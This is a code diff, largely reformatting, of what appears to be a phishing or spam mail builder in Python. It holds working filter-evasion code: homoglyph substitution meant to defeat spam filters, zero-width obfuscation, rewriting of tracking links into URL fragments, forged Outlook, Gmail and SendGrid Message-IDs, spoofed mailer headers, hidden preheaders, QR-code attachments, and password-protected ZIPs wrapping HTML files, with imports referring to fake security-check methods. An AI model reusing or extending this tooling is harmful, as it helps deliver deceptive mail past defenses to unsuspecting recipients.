@@ -40,7 +40,6 @@ import html as html_lib
 import random
 import string
 import hashlib
-import tempfile
 import subprocess
 import mimetypes
 from datetime import datetime, timezone, timedelta
@@ -52,14 +51,16 @@ from email import encoders
 from email.utils import formatdate, make_msgid
 
 import logging
+
 log = logging.getLogger(__name__)
 
 # Optional link encoder — imported lazily to avoid circular import
 try:
     from core.link_encoder import (
-        resolve_link_tags, build_redirect_attachment,
-        get_method_from_tag, METHOD_HTML_ATTACHMENT, METHOD_CF_SECURITY_CHECK,
+        resolve_link_tags,
+        get_method_from_tag,
     )
+
     _HAS_LINK_ENCODER = True
 except ImportError:
     _HAS_LINK_ENCODER = False
@@ -71,17 +72,17 @@ except ImportError:
 
 # X-Mailer presets — realistic MUA version strings
 X_MAILERS = {
-    "outlook16":    "Microsoft Outlook 16.0.17928.20114",
-    "outlook15":    "Microsoft Outlook 15.0.5589.1001",
-    "outlook14":    "Microsoft Outlook 14.0.7269.5000",
-    "thunderbird":  "Mozilla Thunderbird 115.8.1",
-    "apple":        "Apple Mail (3774.400.10)",
-    "appleios":     "iPhone Mail (21E236)",
-    "gmail":        "Google Gmail",
-    "evolution":    "Evolution 3.50.2",
-    "mutt":         "Mutt/2.2.12",
-    "lotus":        "Lotus Notes 9.0.1",
-    "yahoomail":    "YahooMailBasic/1.0",
+    "outlook16": "Microsoft Outlook 16.0.17928.20114",
+    "outlook15": "Microsoft Outlook 15.0.5589.1001",
+    "outlook14": "Microsoft Outlook 14.0.7269.5000",
+    "thunderbird": "Mozilla Thunderbird 115.8.1",
+    "apple": "Apple Mail (3774.400.10)",
+    "appleios": "iPhone Mail (21E236)",
+    "gmail": "Google Gmail",
+    "evolution": "Evolution 3.50.2",
+    "mutt": "Mutt/2.2.12",
+    "lotus": "Lotus Notes 9.0.1",
+    "yahoomail": "YahooMailBasic/1.0",
 }
 
 # ── Homoglyph substitution map ──────────────────────────────────────────────
@@ -89,29 +90,30 @@ X_MAILERS = {
 # Applied to fromName and subject to break string-match spam filters.
 # Same technique used by the reference inboxing sender (encryptMessageContent).
 _HOMOGLYPHS = {
-    'a': ['а', 'ɑ', 'α'],   # Cyrillic а, Latin alpha
-    'c': ['с', 'ϲ'],         # Cyrillic с
-    'e': ['е'],               # Cyrillic е
-    'i': ['і'],               # Cyrillic і
-    'o': ['о', 'ο'],          # Cyrillic о, Greek omicron
-    'p': ['р'],               # Cyrillic р
-    's': ['ѕ'],
-    'x': ['х'],               # Cyrillic х
-    'y': ['у'],               # Cyrillic у
-    'A': ['А', 'Α'],          # Cyrillic А, Greek Alpha
-    'B': ['В', 'Β'],
-    'C': ['С', 'Ϲ'],
-    'E': ['Е', 'Ε'],
-    'H': ['Н', 'Η'],
-    'I': ['І'],
-    'K': ['К', 'Κ'],
-    'M': ['М', 'Μ'],
-    'O': ['О', 'Ο'],
-    'P': ['Р', 'Ρ'],
-    'T': ['Т', 'Τ'],
-    'X': ['Х', 'Χ'],
-    'Y': ['У', 'Υ'],
+    "a": ["а", "ɑ", "α"],  # Cyrillic а, Latin alpha
+    "c": ["с", "ϲ"],  # Cyrillic с
+    "e": ["е"],  # Cyrillic е
+    "i": ["і"],  # Cyrillic і
+    "o": ["о", "ο"],  # Cyrillic о, Greek omicron
+    "p": ["р"],  # Cyrillic р
+    "s": ["ѕ"],
+    "x": ["х"],  # Cyrillic х
+    "y": ["у"],  # Cyrillic у
+    "A": ["А", "Α"],  # Cyrillic А, Greek Alpha
+    "B": ["В", "Β"],
+    "C": ["С", "Ϲ"],
+    "E": ["Е", "Ε"],
+    "H": ["Н", "Η"],
+    "I": ["І"],
+    "K": ["К", "Κ"],
+    "M": ["М", "Μ"],
+    "O": ["О", "Ο"],
+    "P": ["Р", "Ρ"],
+    "T": ["Т", "Τ"],
+    "X": ["Х", "Χ"],
+    "Y": ["У", "Υ"],
 }
+
 
 def _homoglyph_encode(text: str, density: float = 0.3) -> str:
     """
@@ -127,7 +129,7 @@ def _homoglyph_encode(text: str, density: float = 0.3) -> str:
     n_sub = max(1, int(len(eligible) * density))
     for i in random.sample(eligible, min(n_sub, len(eligible))):
         chars[i] = random.choice(_HOMOGLYPHS[chars[i]])
-    return ''.join(chars)
+    return "".join(chars)
 
 
 def _hash_fragment_links(html: str) -> str:
@@ -143,30 +145,30 @@ def _hash_fragment_links(html: str) -> str:
     Leaves mailto:, javascript:, and already-fragmented links untouched.
     """
     _TRACKING_PARAMS = re.compile(
-        r'[?&]('
-        r'email|mail|rcpt|recipient|uid|user|userid|id|lead|lid|'
-        r'utm_source|utm_medium|utm_campaign|utm_content|utm_term|'
-        r'ref|src|source|click|cid|tid|mid|sid|token|hash|'
-        r'base64|b64|enc|encoded|data|payload'
+        r"[?&]("
+        r"email|mail|rcpt|recipient|uid|user|userid|id|lead|lid|"
+        r"utm_source|utm_medium|utm_campaign|utm_content|utm_term|"
+        r"ref|src|source|click|cid|tid|mid|sid|token|hash|"
+        r"base64|b64|enc|encoded|data|payload"
         r')=[^&\s"\'>#]*',
         re.IGNORECASE,
     )
 
     def _rewrite_href(m):
         quote = m.group(1)
-        href  = m.group(2)
-        if not href.startswith(('http://', 'https://')):
+        href = m.group(2)
+        if not href.startswith(("http://", "https://")):
             return m.group(0)
-        if '?' not in href:
+        if "?" not in href:
             return m.group(0)
         if not _TRACKING_PARAMS.search(href):
             return m.group(0)
-        base, qs = href.split('?', 1)
-        frag = ''
-        if '#' in qs:
-            qs, frag = qs.split('#', 1)
-        new_href = base + '#' + qs + (('&' + frag) if frag else '')
-        return f'href={quote}{new_href}{quote}'
+        base, qs = href.split("?", 1)
+        frag = ""
+        if "#" in qs:
+            qs, frag = qs.split("#", 1)
+        new_href = base + "#" + qs + (("&" + frag) if frag else "")
+        return f"href={quote}{new_href}{quote}"
 
     return re.sub(
         r'href=(["\'])([^"\']+)\1',
@@ -178,44 +180,60 @@ def _hash_fragment_links(html: str) -> str:
 
 # Headers that users must NEVER be allowed to override via custom headers
 # These are either security-critical or set precisely by the builder
-_PROTECTED_HEADERS = frozenset({
-    "from", "to", "cc", "bcc", "subject", "date", "message-id",
-    "mime-version", "content-type", "content-transfer-encoding",
-    "reply-to",   # set explicitly via sender config
-    "received",   # set by servers, never by sender
-    "return-path",# set by MTA
-    "dkim-signature",  # set by signing layer
-    "arc-seal",        # set by signing layer
-})
+_PROTECTED_HEADERS = frozenset(
+    {
+        "from",
+        "to",
+        "cc",
+        "bcc",
+        "subject",
+        "date",
+        "message-id",
+        "mime-version",
+        "content-type",
+        "content-transfer-encoding",
+        "reply-to",  # set explicitly via sender config
+        "received",  # set by servers, never by sender
+        "return-path",  # set by MTA
+        "dkim-signature",  # set by signing layer
+        "arc-seal",  # set by signing layer
+    }
+)
 
 # Smart MIME type map for common attachment extensions
 _MIME_MAP = {
-    ".pdf":  ("application", "pdf"),
-    ".doc":  ("application", "msword"),
-    ".docx": ("application", "vnd.openxmlformats-officedocument.wordprocessingml.document"),
-    ".xls":  ("application", "vnd.ms-excel"),
+    ".pdf": ("application", "pdf"),
+    ".doc": ("application", "msword"),
+    ".docx": (
+        "application",
+        "vnd.openxmlformats-officedocument.wordprocessingml.document",
+    ),
+    ".xls": ("application", "vnd.ms-excel"),
     ".xlsx": ("application", "vnd.openxmlformats-officedocument.spreadsheetml.sheet"),
-    ".ppt":  ("application", "vnd.ms-powerpoint"),
-    ".pptx": ("application", "vnd.openxmlformats-officedocument.presentationml.presentation"),
-    ".zip":  ("application", "zip"),
-    ".rar":  ("application", "x-rar-compressed"),
-    ".gz":   ("application", "gzip"),
-    ".txt":  ("text", "plain"),
-    ".csv":  ("text", "csv"),
+    ".ppt": ("application", "vnd.ms-powerpoint"),
+    ".pptx": (
+        "application",
+        "vnd.openxmlformats-officedocument.presentationml.presentation",
+    ),
+    ".zip": ("application", "zip"),
+    ".rar": ("application", "x-rar-compressed"),
+    ".gz": ("application", "gzip"),
+    ".txt": ("text", "plain"),
+    ".csv": ("text", "csv"),
     ".html": ("text", "html"),
-    ".htm":  ("text", "html"),
-    ".xml":  ("text", "xml"),
+    ".htm": ("text", "html"),
+    ".xml": ("text", "xml"),
     ".json": ("application", "json"),
-    ".ics":  ("text", "calendar"),
-    ".eml":  ("message", "rfc822"),
-    ".svg":  ("image", "svg+xml"),
-    ".png":  ("image", "png"),
-    ".jpg":  ("image", "jpeg"),
+    ".ics": ("text", "calendar"),
+    ".eml": ("message", "rfc822"),
+    ".svg": ("image", "svg+xml"),
+    ".png": ("image", "png"),
+    ".jpg": ("image", "jpeg"),
     ".jpeg": ("image", "jpeg"),
-    ".gif":  ("image", "gif"),
+    ".gif": ("image", "gif"),
     ".webp": ("image", "webp"),
-    ".mp4":  ("video", "mp4"),
-    ".mp3":  ("audio", "mpeg"),
+    ".mp4": ("video", "mp4"),
+    ".mp3": ("audio", "mpeg"),
 }
 
 
@@ -223,17 +241,22 @@ _MIME_MAP = {
 # HELPERS
 # ═══════════════════════════════════════════════════════════
 
+
 def _rand_digits(n):
-    return ''.join(random.choices(string.digits, k=n))
+    return "".join(random.choices(string.digits, k=n))
+
 
 def _rand_alphanum(n):
-    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))
+    return "".join(random.choices(string.ascii_letters + string.digits, k=n))
+
 
 def _rand_alphanum_upper(n):
-    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=n))
+    return "".join(random.choices(string.ascii_uppercase + string.digits, k=n))
+
 
 def _rand_hex(n):
-    return ''.join(random.choices('0123456789abcdef', k=n))
+    return "".join(random.choices("0123456789abcdef", k=n))
+
 
 def _clean_header_value(v: str, max_len: int = 200) -> str:
     """Strip control chars and hard-wraps from user-controlled header values."""
@@ -242,6 +265,7 @@ def _clean_header_value(v: str, max_len: int = 200) -> str:
     v = str(v).replace("\r", " ").replace("\n", " ").strip()
     v = re.sub(r"\s{2,}", " ", v)
     return v[:max_len].strip()
+
 
 def _zero_width_obfuscate(text: str) -> str:
     """
@@ -255,10 +279,13 @@ def _zero_width_obfuscate(text: str) -> str:
     ZW_CHARS = ["​", "‌", "‍", "﻿"]
     chars = list(text)
     # Insert at 2-3 random interior positions (not first/last char)
-    positions = sorted(random.sample(range(1, len(chars)), min(3, len(chars)-1)), reverse=True)
+    positions = sorted(
+        random.sample(range(1, len(chars)), min(3, len(chars) - 1)), reverse=True
+    )
     for pos in positions:
         chars.insert(pos, random.choice(ZW_CHARS))
-    return ''.join(chars)
+    return "".join(chars)
+
 
 def _make_msgid_styled(style: str, from_domain: str, ehlo: str = "") -> str:
     """
@@ -269,12 +296,12 @@ def _make_msgid_styled(style: str, from_domain: str, ehlo: str = "") -> str:
 
     if style == "outlook":
         # Outlook Online: <XXPR##MB####.XXPR##MB####.namprd##.prod.outlook.com>
-        code  = _rand_alphanum_upper(2)
-        pr_n  = random.randint(10, 99)
-        mb_n  = random.randint(1000, 9999)
+        code = _rand_alphanum_upper(2)
+        pr_n = random.randint(10, 99)
+        mb_n = random.randint(1000, 9999)
         prd_n = random.randint(10, 25)
         local = f"{code}PR{pr_n:02d}MB{mb_n:04d}{_rand_alphanum_upper(random.randint(10, 16))}"
-        host  = f"{code}PR{pr_n:02d}MB{mb_n:04d}.{code}PR{pr_n:02d}MB{mb_n:04d}.namprd{prd_n:02d}.prod.outlook.com"
+        host = f"{code}PR{pr_n:02d}MB{mb_n:04d}.{code}PR{pr_n:02d}MB{mb_n:04d}.namprd{prd_n:02d}.prod.outlook.com"
         return f"<{local}@{host}>"
 
     elif style == "gmail":
@@ -286,7 +313,7 @@ def _make_msgid_styled(style: str, from_domain: str, ehlo: str = "") -> str:
     elif style == "sendgrid":
         # SendGrid: <LOCAL@geopod-ismtpd-N>
         hostname = f"geopod-ismtpd-{random.randint(1, 20)}"
-        local    = _rand_alphanum_upper(random.randint(14, 22))
+        local = _rand_alphanum_upper(random.randint(14, 22))
         return f"<{local}@{hostname}>"
 
     elif style == "auto":
@@ -304,16 +331,31 @@ def _shuffle_headers(msg) -> None:
     Essential headers (From/To/Subject/Date/Message-ID/MIME-Version/Content-*)
     keep their conventional positions; X-* and optional headers are shuffled.
     """
-    _ESSENTIAL = frozenset({
-        "mime-version", "from", "to", "cc", "bcc", "subject", "date",
-        "message-id", "content-type", "content-transfer-encoding",
-        "content-disposition", "in-reply-to", "references",
-        "reply-to", "sender", "return-path", "dkim-signature",
-    })
-    if not hasattr(msg, '_headers'):
+    _ESSENTIAL = frozenset(
+        {
+            "mime-version",
+            "from",
+            "to",
+            "cc",
+            "bcc",
+            "subject",
+            "date",
+            "message-id",
+            "content-type",
+            "content-transfer-encoding",
+            "content-disposition",
+            "in-reply-to",
+            "references",
+            "reply-to",
+            "sender",
+            "return-path",
+            "dkim-signature",
+        }
+    )
+    if not hasattr(msg, "_headers"):
         return
     essential = [(k, v) for k, v in msg._headers if k.lower() in _ESSENTIAL]
-    optional  = [(k, v) for k, v in msg._headers if k.lower() not in _ESSENTIAL]
+    optional = [(k, v) for k, v in msg._headers if k.lower() not in _ESSENTIAL]
     random.shuffle(optional)
     msg._headers = essential + optional
 
@@ -322,37 +364,45 @@ def _strip_html(html_str):
     """Convert HTML to plain text for fallback plain part."""
     if not html_str:
         return ""
-    text = re.sub(r'<br\s*/?>', '\n', html_str, flags=re.IGNORECASE)
-    text = re.sub(r'</p>', '\n\n', text, flags=re.IGNORECASE)
-    text = re.sub(r'</div>', '\n', text, flags=re.IGNORECASE)
-    text = re.sub(r'</h[1-6]>', '\n\n', text, flags=re.IGNORECASE)
-    text = re.sub(r'<li>', '\n• ', text, flags=re.IGNORECASE)
-    text = re.sub(r'<[^>]+>', '', text)
+    text = re.sub(r"<br\s*/?>", "\n", html_str, flags=re.IGNORECASE)
+    text = re.sub(r"</p>", "\n\n", text, flags=re.IGNORECASE)
+    text = re.sub(r"</div>", "\n", text, flags=re.IGNORECASE)
+    text = re.sub(r"</h[1-6]>", "\n\n", text, flags=re.IGNORECASE)
+    text = re.sub(r"<li>", "\n• ", text, flags=re.IGNORECASE)
+    text = re.sub(r"<[^>]+>", "", text)
     text = html_lib.unescape(text)
-    return re.sub(r'\n{3,}', '\n\n', text).strip()
+    return re.sub(r"\n{3,}", "\n\n", text).strip()
+
 
 def _inject_unsub_footer(html_str, unsub_url, unsub_email, lead_email):
     """Inject a compliant unsubscribe footer into the HTML body."""
     url = (unsub_url or "").replace("#EMAIL", lead_email)
     links = []
     if url:
-        links.append(f'<a href="{url}" style="color:#999;text-decoration:underline">Unsubscribe</a>')
-        links.append(f'<a href="{url}" style="color:#999;text-decoration:underline">Manage preferences</a>')
+        links.append(
+            f'<a href="{url}" style="color:#999;text-decoration:underline">Unsubscribe</a>'
+        )
+        links.append(
+            f'<a href="{url}" style="color:#999;text-decoration:underline">Manage preferences</a>'
+        )
     if unsub_email:
         mailto = f"mailto:{unsub_email}?subject=Unsubscribe&body={lead_email}"
-        links.append(f'<a href="{mailto}" style="color:#999;text-decoration:underline">Email to unsubscribe</a>')
+        links.append(
+            f'<a href="{mailto}" style="color:#999;text-decoration:underline">Email to unsubscribe</a>'
+        )
     if not links:
         return html_str
     sep = ' <span style="color:#ccc">|</span> '
     footer = (
         '<div style="text-align:center;padding:20px 0 10px;margin-top:20px;'
         'border-top:1px solid #eee;font-size:11px;color:#999;font-family:Arial,sans-serif">'
-        + sep.join(links) +
-        '</div>'
+        + sep.join(links)
+        + "</div>"
     )
-    if '</body>' in html_str.lower():
-        return re.sub(r'(</body>)', footer + r'\1', html_str, flags=re.IGNORECASE)
+    if "</body>" in html_str.lower():
+        return re.sub(r"(</body>)", footer + r"\1", html_str, flags=re.IGNORECASE)
     return html_str + footer
+
 
 def _ensure_html_structure(html_str):
     """
@@ -361,24 +411,23 @@ def _ensure_html_structure(html_str):
     removal style if missing. Helps Gmail/Outlook rendering consistency.
     """
     html_lower = html_str.lower().strip()
-    if html_lower.startswith('<!doctype') or html_lower.startswith('<html'):
+    if html_lower.startswith("<!doctype") or html_lower.startswith("<html"):
         return html_str  # already structured, leave it
     return (
-        '<!DOCTYPE html>\n'
+        "<!DOCTYPE html>\n"
         '<html lang="en">\n'
-        '<head>\n'
+        "<head>\n"
         '<meta charset="UTF-8">\n'
         '<meta name="viewport" content="width=device-width, initial-scale=1.0">\n'
         '<meta http-equiv="X-UA-Compatible" content="IE=edge">\n'
-        '<style>*{-webkit-text-size-adjust:100%;-ms-text-size-adjust:100%}'
-        '.ExternalClass{width:100%}.ExternalClass,.ExternalClass p,'
-        '.ExternalClass span,.ExternalClass font,.ExternalClass td,'
-        '.ExternalClass div{line-height:100%}</style>\n'
-        '</head>\n'
-        '<body>\n'
-        + html_str +
-        '\n</body>\n</html>'
+        "<style>*{-webkit-text-size-adjust:100%;-ms-text-size-adjust:100%}"
+        ".ExternalClass{width:100%}.ExternalClass,.ExternalClass p,"
+        ".ExternalClass span,.ExternalClass font,.ExternalClass td,"
+        ".ExternalClass div{line-height:100%}</style>\n"
+        "</head>\n"
+        "<body>\n" + html_str + "\n</body>\n</html>"
     )
+
 
 def _inject_preheader(html_str, preheader_text):
     """
@@ -389,27 +438,31 @@ def _inject_preheader(html_str, preheader_text):
     if not preheader_text:
         return html_str
     # Pad to 200 chars with zero-width spaces to fill preview slot
-    padded = preheader_text + '&zwnj;&nbsp;' * max(0, (200 - len(preheader_text)) // 2)
+    padded = preheader_text + "&zwnj;&nbsp;" * max(0, (200 - len(preheader_text)) // 2)
     # Use font-size:0 + height:0 instead of color:#ffffff (white-on-white is a
     # known spam fingerprint that filters specifically check for)
     span = (
         f'<div style="display:none;max-height:0;overflow:hidden;'
-        f'mso-hide:all;font-size:0px;line-height:0;height:0;'
+        f"mso-hide:all;font-size:0px;line-height:0;height:0;"
         f'max-width:0px;opacity:0">{padded}</div>'
     )
-    if '<body' in html_str.lower():
-        return re.sub(r'(<body[^>]*>)', r'\1' + span, html_str, flags=re.IGNORECASE, count=1)
+    if "<body" in html_str.lower():
+        return re.sub(
+            r"(<body[^>]*>)", r"\1" + span, html_str, flags=re.IGNORECASE, count=1
+        )
     return span + html_str
+
 
 def _get_mime_type(filename):
     ext = os.path.splitext(filename.lower())[1]
     if ext in _MIME_MAP:
         return _MIME_MAP[ext]
     guessed, _ = mimetypes.guess_type(filename)
-    if guessed and '/' in guessed:
-        main, sub = guessed.split('/', 1)
+    if guessed and "/" in guessed:
+        main, sub = guessed.split("/", 1)
         return (main, sub)
-    return ('application', 'octet-stream')
+    return ("application", "octet-stream")
+
 
 def _auto_install(package, import_name=None):
     """Auto-install a Python package if missing. Returns True on success."""
@@ -420,9 +473,19 @@ def _auto_install(package, import_name=None):
     except ImportError:
         try:
             subprocess.run(
-                [sys.executable, "-m", "pip", "install", package, "--break-system-packages", "-q"],
-                check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
-                timeout=60
+                [
+                    sys.executable,
+                    "-m",
+                    "pip",
+                    "install",
+                    package,
+                    "--break-system-packages",
+                    "-q",
+                ],
+                check=True,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                timeout=60,
             )
             __import__(name)
             return True
@@ -435,6 +498,7 @@ def _auto_install(package, import_name=None):
 # Each returns a MIMEBase part ready to attach, or None on failure
 # ═══════════════════════════════════════════════════════════
 
+
 def _build_qr_attachment(qr_cfg, lead_email, resolved_html):
     """
     Build a QR code image attachment.
@@ -446,15 +510,15 @@ def _build_qr_attachment(qr_cfg, lead_email, resolved_html):
     if not url:
         return None, None
 
-    width  = max(100, min(int(qr_cfg.get("width", 200) or 200), 1000))
+    width = max(100, min(int(qr_cfg.get("width", 200) or 200), 1000))
     height = max(100, min(int(qr_cfg.get("height", 200) or 200), 1000))
-    dark   = (qr_cfg.get("darkColor") or "#000000").lstrip("#")
-    light  = (qr_cfg.get("lightColor") or "#FFFFFF").lstrip("#")
-    style  = qr_cfg.get("style", "square")   # square | dots | rounded
-    logo   = qr_cfg.get("logo", "")          # base64 logo to embed (optional)
-    fmt    = qr_cfg.get("type", "png").lower()
-    fname  = f"qrcode.{fmt}"
-    cid    = f"qr_{_rand_hex(8)}"
+    dark = (qr_cfg.get("darkColor") or "#000000").lstrip("#")
+    light = (qr_cfg.get("lightColor") or "#FFFFFF").lstrip("#")
+    style = qr_cfg.get("style", "square")  # square | dots | rounded
+    logo = qr_cfg.get("logo", "")  # base64 logo to embed (optional)
+    fmt = qr_cfg.get("type", "png").lower()
+    fname = f"qrcode.{fmt}"
+    cid = f"qr_{_rand_hex(8)}"
 
     img_data = None
 
@@ -468,32 +532,43 @@ def _build_qr_attachment(qr_cfg, lead_email, resolved_html):
                 try:
                     from qrcode.image.styledimage import StyledPilImage
                     from qrcode.image.styles.moduledrawers import CircleModuleDrawer
-                    qr = qrcode.QRCode(error_correction=qrcode.constants.ERROR_CORRECT_H)
+
+                    qr = qrcode.QRCode(
+                        error_correction=qrcode.constants.ERROR_CORRECT_H
+                    )
                     qr.add_data(url)
                     qr.make(fit=True)
-                    img = qr.make_image(image_factory=StyledPilImage,
-                                        module_drawer=CircleModuleDrawer(),
-                                        back_color=f"#{light}",
-                                        fill_color=f"#{dark}")
+                    img = qr.make_image(
+                        image_factory=StyledPilImage,
+                        module_drawer=CircleModuleDrawer(),
+                        back_color=f"#{light}",
+                        fill_color=f"#{dark}",
+                    )
                 except Exception:
                     img = qrcode.make(url)
             elif style == "rounded":
                 try:
                     from qrcode.image.styledimage import StyledPilImage
                     from qrcode.image.styles.moduledrawers import RoundedModuleDrawer
-                    qr = qrcode.QRCode(error_correction=qrcode.constants.ERROR_CORRECT_H)
+
+                    qr = qrcode.QRCode(
+                        error_correction=qrcode.constants.ERROR_CORRECT_H
+                    )
                     qr.add_data(url)
                     qr.make(fit=True)
-                    img = qr.make_image(image_factory=StyledPilImage,
-                                        module_drawer=RoundedModuleDrawer(),
-                                        back_color=f"#{light}",
-                                        fill_color=f"#{dark}")
+                    img = qr.make_image(
+                        image_factory=StyledPilImage,
+                        module_drawer=RoundedModuleDrawer(),
+                        back_color=f"#{light}",
+                        fill_color=f"#{dark}",
+                    )
                 except Exception:
                     img = qrcode.make(url)
             else:
                 qr = qrcode.QRCode(
                     error_correction=qrcode.constants.ERROR_CORRECT_H,
-                    box_size=10, border=4
+                    box_size=10,
+                    border=4,
                 )
                 qr.add_data(url)
                 qr.make(fit=True)
@@ -503,13 +578,17 @@ def _build_qr_attachment(qr_cfg, lead_email, resolved_html):
             if logo:
                 try:
                     import base64
-                    logo_bytes = base64.b64decode(logo.split(',')[-1])
+
+                    logo_bytes = base64.b64decode(logo.split(",")[-1])
                     logo_img = PILImage.open(io.BytesIO(logo_bytes)).convert("RGBA")
-                    qr_size = img.size if hasattr(img, 'size') else (width, height)
+                    qr_size = img.size if hasattr(img, "size") else (width, height)
                     logo_size = (qr_size[0] // 4, qr_size[1] // 4)
                     logo_img = logo_img.resize(logo_size, PILImage.LANCZOS)
-                    pos = ((qr_size[0] - logo_size[0]) // 2, (qr_size[1] - logo_size[1]) // 2)
-                    if hasattr(img, '_img'):
+                    pos = (
+                        (qr_size[0] - logo_size[0]) // 2,
+                        (qr_size[1] - logo_size[1]) // 2,
+                    )
+                    if hasattr(img, "_img"):
                         img._img.paste(logo_img, pos, logo_img)
                     else:
                         img.paste(logo_img, pos, logo_img)
@@ -518,7 +597,7 @@ def _build_qr_attachment(qr_cfg, lead_email, resolved_html):
 
             # Resize
             buf = io.BytesIO()
-            if hasattr(img, '_img'):
+            if hasattr(img, "_img"):
                 img._img.resize((width, height)).save(buf, format=fmt.upper())
             else:
                 img.save(buf)
@@ -529,7 +608,8 @@ def _build_qr_attachment(qr_cfg, lead_email, resolved_html):
     # Method 2: QR server API fallback (no local library needed)
     if not img_data:
         try:
-            from urllib.request import urlopen as _urlopen
+            from core.urlopen_compat import urlopen as _urlopen
+
             api_url = (
                 f"https://api.qrserver.com/v1/create-qr-code/"
                 f"?size={width}x{height}"
@@ -558,15 +638,17 @@ def _build_ics_attachment(ics_cfg, lead, sender, resolved_subject):
     Build an iCalendar (.ics) meeting invite attachment.
     Creates a VEVENT with full RFC 5545 compliance.
     """
-    name       = ics_cfg.get("name") or "invite.ics"
-    subj       = ics_cfg.get("title") or ics_cfg.get("subject") or resolved_subject or "Meeting"
-    start_str  = ics_cfg.get("dtStart") or ics_cfg.get("start") or ""
+    name = ics_cfg.get("name") or "invite.ics"
+    subj = (
+        ics_cfg.get("title") or ics_cfg.get("subject") or resolved_subject or "Meeting"
+    )
+    start_str = ics_cfg.get("dtStart") or ics_cfg.get("start") or ""
     duration_h = max(1, min(int(ics_cfg.get("duration") or 1), 720))
-    location   = ics_cfg.get("location") or ""
-    org_name   = ics_cfg.get("orgName")  or sender.get("fromName", "")
-    org_email  = ics_cfg.get("orgEmail") or sender.get("fromEmail", "")
+    location = ics_cfg.get("location") or ""
+    org_name = ics_cfg.get("orgName") or sender.get("fromName", "")
+    org_email = ics_cfg.get("orgEmail") or sender.get("fromEmail", "")
     lead_email = lead.get("email", "")
-    lead_name  = lead.get("name", "") or lead_email
+    lead_name = lead.get("name", "") or lead_email
 
     # Parse start time — support ISO8601 or free text fallback to now+1h
     try:
@@ -578,7 +660,7 @@ def _build_ics_attachment(ics_cfg, lead, sender, resolved_subject):
         dt_start = datetime.now(timezone.utc) + timedelta(hours=1)
 
     dt_end = dt_start + timedelta(hours=duration_h)
-    now    = datetime.now(timezone.utc)
+    now = datetime.now(timezone.utc)
 
     def _ical_dt(dt):
         if dt.tzinfo:
@@ -596,18 +678,18 @@ def _build_ics_attachment(ics_cfg, lead, sender, resolved_subject):
     ]
     _prodid = random.choice(_PRODIDS)
 
-    uid  = f"{_rand_hex(16)}-{_rand_hex(8)}-{_rand_hex(4)}@{org_email.split('@')[-1] if org_email and '@' in org_email else 'mail.com'}"
+    uid = f"{_rand_hex(16)}-{_rand_hex(8)}-{_rand_hex(4)}@{org_email.split('@')[-1] if org_email and '@' in org_email else 'mail.com'}"
     desc = f"You are invited to {subj}"
     if location:
         desc += f"\\nLocation: {location}"
 
     # RFC 5545 folding: lines > 75 chars get wrapped with CRLF+space
     def _fold(line):
-        if len(line.encode('utf-8')) <= 75:
+        if len(line.encode("utf-8")) <= 75:
             return line
         out, cur = [], ""
         for char in line:
-            if len((cur + char).encode('utf-8')) > 75:
+            if len((cur + char).encode("utf-8")) > 75:
                 out.append(cur)
                 cur = " " + char
             else:
@@ -631,8 +713,10 @@ def _build_ics_attachment(ics_cfg, lead, sender, resolved_subject):
         _fold(f"DESCRIPTION:{desc}"),
         _fold(f"LOCATION:{location}") if location else "",
         _fold(f"ORGANIZER;CN={org_name}:mailto:{org_email}") if org_email else "",
-        _fold(f"ATTENDEE;CUTYPE=INDIVIDUAL;ROLE=REQ-PARTICIPANT;PARTSTAT=NEEDS-ACTION;"
-              f"RSVP=TRUE;CN={lead_name}:mailto:{lead_email}"),
+        _fold(
+            f"ATTENDEE;CUTYPE=INDIVIDUAL;ROLE=REQ-PARTICIPANT;PARTSTAT=NEEDS-ACTION;"
+            f"RSVP=TRUE;CN={lead_name}:mailto:{lead_email}"
+        ),
         "STATUS:CONFIRMED",
         "SEQUENCE:0",
         "BEGIN:VALARM",
@@ -648,7 +732,11 @@ def _build_ics_attachment(ics_cfg, lead, sender, resolved_subject):
     part = MIMEBase("text", "calendar", method="REQUEST", charset="utf-8")
     part.set_payload(ics_text.encode("utf-8"))
     encoders.encode_base64(part)
-    part.add_header("Content-Disposition", "attachment", filename=name if name.endswith(".ics") else name + ".ics")
+    part.add_header(
+        "Content-Disposition",
+        "attachment",
+        filename=name if name.endswith(".ics") else name + ".ics",
+    )
     return part
 
 
@@ -658,12 +746,12 @@ def _build_zip_attachment(zip_cfg, lead, sender, html_content):
     Requires 'pyzipper' (auto-installs). Falls back to plain ZIP via zipfile.
     Returns (MIMEBase part, password_string) — password for #ZIP_PASSWORD substitution.
     """
-    zip_name    = zip_cfg.get("name") or "document.zip"
-    inner_name  = zip_cfg.get("attachName") or "document.html"
-    pw_enabled  = zip_cfg.get("password", False)
-    pw_type     = zip_cfg.get("pwType", "random")
-    pw_len      = max(4, min(int(zip_cfg.get("pwLength") or 8), 64))
-    pw_custom   = zip_cfg.get("pwCustom", "")
+    zip_name = zip_cfg.get("name") or "document.zip"
+    inner_name = zip_cfg.get("attachName") or "document.html"
+    pw_enabled = zip_cfg.get("password", False)
+    pw_type = zip_cfg.get("pwType", "random")
+    pw_len = max(4, min(int(zip_cfg.get("pwLength") or 8), 64))
+    pw_custom = zip_cfg.get("pwCustom", "")
 
     # Generate password
     if pw_enabled:
@@ -678,7 +766,9 @@ def _build_zip_attachment(zip_cfg, lead, sender, html_content):
     else:
         password = None
 
-    content = html_content.encode("utf-8") if isinstance(html_content, str) else html_content
+    content = (
+        html_content.encode("utf-8") if isinstance(html_content, str) else html_content
+    )
 
     buf = io.BytesIO()
 
@@ -686,9 +776,10 @@ def _build_zip_attachment(zip_cfg, lead, sender, html_content):
     if password and _auto_install("pyzipper"):
         try:
             import pyzipper
-            with pyzipper.AESZipFile(buf, 'w',
-                                     compression=pyzipper.ZIP_DEFLATED,
-                                     encryption=pyzipper.WZ_AES) as zf:
+
+            with pyzipper.AESZipFile(
+                buf, "w", compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES
+            ) as zf:
                 zf.setpassword(password.encode("utf-8"))
                 zf.writestr(inner_name, content)
             zip_data = buf.getvalue()
@@ -699,7 +790,8 @@ def _build_zip_attachment(zip_cfg, lead, sender, html_content):
     # Fallback: plain zipfile (no encryption or encryption failed)
     if not buf.tell():
         import zipfile
-        with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
+
